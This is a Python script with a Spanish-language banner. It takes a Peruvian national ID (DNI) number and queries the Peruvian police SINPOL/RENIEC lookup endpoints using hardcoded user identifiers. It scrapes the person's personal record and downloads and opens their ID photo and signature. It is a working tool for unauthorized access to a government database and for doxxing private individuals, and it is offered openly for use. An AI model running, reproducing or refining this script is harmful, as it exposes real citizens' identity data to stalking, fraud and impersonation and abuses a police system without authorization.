import requests
from bs4 import BeautifulSoup
import random
import base64
import subprocess



def obtener_informacion_dni(dni):

    while True:
        if len(dni) != 8:
            if len(dni) < 8:
                print("El DNI debe tener 8 dígitos.")
            else:
                print("El DNI no puede tener más de 8 dígitos.")

            dni = input("Ingresa el DNI (8 dígitos): ")
        elif not dni.isdigit():

            print("El DNI solo puede contener números.")
            dni = input("Ingresa el DNI (8 dígitos): ")
        else:

            obtener_informacion(dni)

            break



def obtener_informacion(dni):

    random_value = str(random.random())



    login_url = f"https://sinpol.pnp.gob.pe/esinpol/action/picklist/percden/reniecden/dni/form?dni={dni}&cierre=T&ip=30161843&user=30161843&dniUsuario=41372848"
    login1 = requests.get(login_url)
    cookie1 = login1.headers["Set-Cookie"].split(";")[0]



    search_url = "https://sinpol.pnp.gob.pe/esinpol/action/picklist/percden/reniecden/dni/search?"

    params = {"random": random_value}
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie": cookie1}
    soli1 = requests.get(search_url, params=params, headers=headers)



    soup = BeautifulSoup(soli1.content, "html.parser")
    values = {}



    for tr in soup.find_all("tr"):
        tds = tr.find_all("td")

        if len(tds) == 2:

            key = tds[0].text.strip()
            value = tds[1].text.strip()
            values[key] = value


    foto_url = f"https://sinpol.pnp.gob.pe/esinpol/action/picklist/percden/reniecden/dni/foto?random={random_value}"

    soli2 = requests.get(foto_url, headers=headers)

    with open('foto1.jpg', 'wb') as f:
        f.write(soli2.content)


    firma_url = f"https://sinpol.pnp.gob.pe/esinpol/action/picklist/percden/reniecden/dni/firma?random={random_value}"
    soli3 = requests.get(firma_url, headers=headers)

    with open('foto2.jpg', 'wb') as f:
        f.write(soli3.content)



    for key, value in values.items():
        if key != "foto_base64_1":
            print(f"{key}: {value}")



    subprocess.run(['xdg-open', 'foto1.jpg'])
    subprocess.run(['xdg-open', 'foto2.jpg'])

    

print("""


      
████████╗██████╗ ██████╗ ██████╗  ██████ ██╗     
╚══██╔══╝██╔══██╗╚════██╗██╔══██╗██╔═══██╗██║     
   ██║   ██████╔╝ █████╔╝██████╔╝██║   ██║██║     
   ██║   ██╔══██╗ ╚═══██╗██╔══██╗██║   ██║██║     
   ██║   ██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗
   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ uwu
                               
 MI INSTAGRAM: samuel.rc_

[+] SOLO PERSONAS DE PERU
[+] SOLO CON DNI

""")



dni = input("ESCRIBE EL NÚMERO DE DNI: ")
obtener_informacion_dni(dni)